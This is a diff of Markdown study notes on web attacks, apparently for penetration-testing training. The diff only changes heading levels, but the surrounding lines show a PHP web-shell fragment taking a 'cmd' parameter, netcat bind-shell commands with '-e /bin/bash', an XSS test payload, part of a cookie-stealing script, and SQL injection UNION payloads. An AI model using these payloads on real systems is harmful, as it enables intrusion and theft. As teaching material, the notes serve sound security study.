@@ -1,8 +1,6 @@
 # Web Attacks
 
-## Web Attacks
-
-### Fingerprinting with `nc`, `openssl` & `httprint`
+## Fingerprinting with `nc`, `openssl` & `httprint`
 
 Web applications use different technologies and programming paradigms compared to desktop apps:
 
@@ -38,7 +36,7 @@ printf 'GET / HTTP/1.1\r\nHost: github.com\r\n\r\n' | ncat --ssl github.com 443
 # -s set the signature file to use
 ```
 
-### HTTP Verbs
+## HTTP Verbs
 
 * REST APIs are specific type of webapp that relies strongly on almost all HTTP verbs
 * In REST APIs is common to use PUT for saving data, and not for saving files
@@ -80,7 +78,7 @@ OPTIONS / HTTP/1.1
 Host: www.example.site
 ```
 
-### Exploiting Misconfigured HTTP verbs
+## Exploiting Misconfigured HTTP verbs
 
 * 1st you enumerate verbs with an OPTIONS message in `nc`
 * To exploit the DELETE verb, you just have to specify the file you want to delete from the server
@@ -114,7 +112,7 @@ if (isset($_GET['cmd'])) {
 }
 ```
 
-### `nc`
+## `nc`
 
 ```bash
 # => server/listener
@@ -153,7 +151,7 @@ nc -lvp 5555 -e /bin/bash
 echo 'ls' | nc -v localhost 5555
 ```
 
-### Directories and Files Enumeration
+## Directories and Files Enumeration
 
 > Ability to:
 >
@@ -180,7 +178,7 @@ Tool:
   * You can choose if you want to perform a pure brute-force or a dictionary-based brute-force
   * It's Linux alternative: `dirb`
 
-### Dirb
+## Dirb
 
 ```bash
 dirb http://google.com /usr/share/dirb/wordlists/small.txt -a "USER AGENT HERE"
@@ -197,7 +195,7 @@ dirb http://google.com -x extensions.txt -z 1000
 dirb http://google.com -x extensions.txt -o results.txt # output results to file
 ```
 
-### Dirbuster
+## Dirbuster
 
 ```bash
 # Find all machines in the network
@@ -213,7 +211,7 @@ Find hidden files via dirbuster:
 
 You might find a `config.old` file where the MySQL database connection parameters are visible.
 
-### Google Hacking
+## Google Hacking
 
 Perform information gathering without contacting your targets, ability to find hidden resources: `site:`, `intitle:`, `inurl:`, `filetype:`, `AND`, `OR`, `&`, `|`, `-`
 
@@ -221,7 +219,7 @@ Perform information gathering without contacting your targets, ability to find h
 inurl:(htm|html|php|asp|jsp) intitle:"index of" "last modified" "parent directory" txt OR doc OR pdf
 ```
 
-### Cross Site Scripting
+## Cross Site Scripting
 
 The attacker can target the web applications's users, and:
 
@@ -250,7 +248,7 @@ The attacker can target the web applications's users, and:
 * After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page
 * Test XSS: `<script>alert('XSS')</script>`
 
-### XSS Types
+## XSS Types
 
 **Reflected**
 
@@ -294,7 +292,7 @@ flocse($fp);
 ?>
 ```
 
-### SQL Injections
+## SQL Injections
 
 They allow an unauthorized user to take control over SQL statements used by a web application. This kind of attack has a huge impact on a web site because getting control over a backend database means controlling:
 
@@ -318,7 +316,7 @@ Tests can be:
 * SQL commands: `SELECT`, `UNION` and others
 * SQL comments: `#` or `--`
 
-### SQL basics
+## SQL basics
 
 ```sql
 -- SELECT <columns list> FROM <table> WHERE <conditions>;
@@ -328,7 +326,7 @@ SELECT name, description FROM products WHERE id=9;
 <SELECT statement> UNION <other SELECT statement>;
 ```
 
-### Vulnerable Dynamic Queries
+## Vulnerable Dynamic Queries
 
 ```sql
 -- This dynamic query expects $id values as a string:
@@ -404,7 +402,7 @@ Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean giv
 * Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`.
 * Not only `SELECT` queries are vulnerable.
 
-### SQLMap
+## SQLMap
 
 * Can detect and exploit SQL injections
 * Needs to know the vulnerable URL and the parameter to test for a SQLi
